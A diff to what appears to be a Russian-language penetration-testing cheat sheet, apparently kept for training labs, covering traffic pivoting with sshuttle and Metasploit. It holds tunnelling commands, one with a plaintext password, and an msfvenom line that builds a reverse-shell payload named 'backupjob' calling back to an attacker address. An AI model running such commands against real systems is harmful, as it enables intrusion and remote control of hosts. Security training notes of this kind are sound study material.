@@ -342,8 +342,9 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 
 # проброс трафика через sshuttle
 	sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
-	sshuttle -r ebelford:'ThePlague61780'@10.10.11.54 -N 0.0.0.0/24 (проброс всего трафика)
-
+	sshuttle -r ebelford:'ThePlague61780'@10.10.11.54 -N 0.0.0.0/24 
+	sshuttle --dns -r root@31.15.18.19 0/0 -x 31.15.18.19 (проброс всего трафика)
+	
 # Проброс трафика Metasploit
 
 	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
